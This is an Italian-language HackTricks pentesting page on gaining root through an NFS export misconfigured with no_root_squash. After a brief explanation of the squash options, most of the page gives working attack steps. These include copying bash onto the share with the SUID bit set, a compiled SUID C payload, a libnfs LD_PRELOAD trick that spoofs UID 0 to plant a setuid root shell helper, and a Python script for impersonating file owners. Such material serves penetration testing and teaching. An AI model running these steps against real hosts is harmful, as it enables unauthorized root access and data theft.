# Escalation dei privilegi tramite errata configurazione NFS No Root Squash

{{#include ../../banners/hacktricks-training.md}}

## Informazioni di base sullo squashing

Con NFS AUTH_SYS/AUTH_UNIX, il server basa i controlli dei permessi dei file sui `uid` e `gid` forniti in ogni richiesta RPC. Altri security flavor, come Kerberos, utilizzano credenziali diverse e il server può mappare le credenziali numeriche prima di verificare i permessi.<sup>[[4]](#references)[[5]](#references)</sup>

- **`all_squash`**: Mappa ogni UID e GID sull'account anonimo, che su Linux è `nobody` (65534) per impostazione predefinita. `no_all_squash` è il valore predefinito per le richieste non-root.<sup>[[4]](#references)</sup>
- **`root_squash`**: È il valore predefinito su Linux e mappa le richieste con UID/GID 0 (root) sull'account anonimo; gli altri UID e GID non vengono sottoposti a squash.<sup>[[4]](#references)</sup>
- **`no_root_squash`**: Disabilita il root squashing, quindi le richieste con UID/GID 0 possono essere valutate come root sul server.<sup>[[4]](#references)</sup>

Se un client autorizzato può montare un export scrivibile in **`/etc/exports`** configurato con **`no_root_squash`**, le sue richieste con UID/GID 0 possono scrivere al suo interno come utente root del server.<sup>[[4]](#references)</sup>

Per ulteriori informazioni su **NFS**, consulta:

{{#ref}}
../../network-services-pentesting/nfs-service-pentesting.md
{{#endref}}

## Escalation dei privilegi

### Exploit remoto

Opzione 1 usando bash:
- Su un client autorizzato, monta un export scrivibile come root, copia **`/bin/bash`** al suo interno, imposta il bit **SUID** ed eseguilo da un mount della vittima che non utilizza `nosuid`.<sup>[[2]](#references)[[4]](#references)</sup>
- Affinché il file caricato rimanga di proprietà di root, il server deve utilizzare **`no_root_squash`**. Se root viene sottoposto a squash, un binario SUID per un altro account è possibile solo quando il client può crearlo o possederlo legittimamente con l'UID/GID numerico di quell'account.<sup>[[4]](#references)</sup>
```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```
Opzione 2 usando codice C compilato:
- Monta la directory da un client autorizzato, copia un payload compilato che sfrutta i permessi SUID, imposta il suo bit **SUID** ed eseguilo dalla macchina vittima (vedi alcuni [C SUID payloads](../processes-crontab-systemd-dbus/payloads-to-execute.md#c)).
- Stesse restrizioni di prima
```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```
### Exploit locale

> [!TIP]
> Nota che se puoi creare un **tunnel dalla tua macchina alla macchina vittima, puoi comunque usare la versione Remote per sfruttare questa privilege escalation effettuando il tunnelling delle porte richieste**.\
> Il seguente trucco è utile quando `/etc/exports` limita l'export all'IP della vittima: il client remoto non può montarlo, ma la tecnica locale può operare attraverso la share già montata sull'host autorizzato.<sup>[[2]](#references)</sup>\
> Per questo metodo libnfs non privilegiato, l'export in **`/etc/exports`** deve usare il flag `insecure`, affinché il processo possa usare una source port non riservata; `secure` è l'impostazione predefinita, anche se un processo in grado di effettuare il bind su una porta riservata non necessita di questa opzione.<sup>[[1]](#references)[[4]](#references)</sup>

### Informazioni di base

Un client NFSv3 AUTH_UNIX include il proprio UID effettivo, GID e gruppi in ogni chiamata, e il server li utilizza per i controlli dei permessi. Questa tecnica locale sfrutta questo modello falsificando le credenziali RPC tramite [libnfs](https://github.com/sahlberg/libnfs); il suo modulo preload supporta l'override di UID/GID nel contesto NFS.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[5]](#references)</sup>

#### Compilazione della Library

L'esempio di libnfs potrebbe richiedere modifiche per il kernel target; la procedura qui utilizzata specifica di commentare le syscall fallocate prima di compilare il modulo preload.<sup>[[1]](#references)[[2]](#references)</sup>
```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```
#### Esecuzione dell'Exploit

L'esempio crea un piccolo helper C che avvia una shell, quindi lo inserisce nella share e utilizza `ld_nfs.so` con UID 0 nel contesto NFS per renderlo SUID-root.<sup>[[1]](#references)[[2]](#references)</sup>

1. **Compila il codice dell'exploit:**
```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```
2. **Posiziona l'exploit sulla share e modifica i suoi permessi falsificando l'UID**.<sup>[[1]](#references)[[2]](#references)</sup>
```bash
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```
3. **Esegui l'exploit per ottenere privilegi root**.<sup>[[2]](#references)</sup>
```bash
/mnt/share/a.out
#root
```
### Bonus: NFShell per l'accesso furtivo ai file

Una volta ottenuto l'accesso root, questo pattern `nfsh.py` imposta l'UID effettivo sull'UID del file di destinazione prima di eseguire un comando, consentendo l'accesso senza modificare ricorsivamente la proprietà.<sup>[[2]](#references)</sup>
```python
#!/usr/bin/env python
# script from https://www.errno.fr/nfs_privesc.html
import sys
import os

def get_file_uid(filepath):
try:
uid = os.stat(filepath).st_uid
except OSError as e:
return get_file_uid(os.path.dirname(filepath))
return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```
Esegui come:
```bash
# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
```
## References

- [1] [lnv42/libnfs](https://github.com/lnv42/libnfs)
- [2] [Una storia di una privesc NFS meno conosciuta](https://www.errno.fr/nfs_privesc.html)
- [3] [sahlberg/libnfs](https://github.com/sahlberg/libnfs)
- [4] [exports(5) — pagina del manuale di Linux](https://man7.org/linux/man-pages/man5/exports.5.html)
- [5] [RFC 1813: Specifica del protocollo NFS versione 3](https://datatracker.ietf.org/doc/html/rfc1813)
{{#include ../../banners/hacktricks-training.md}}
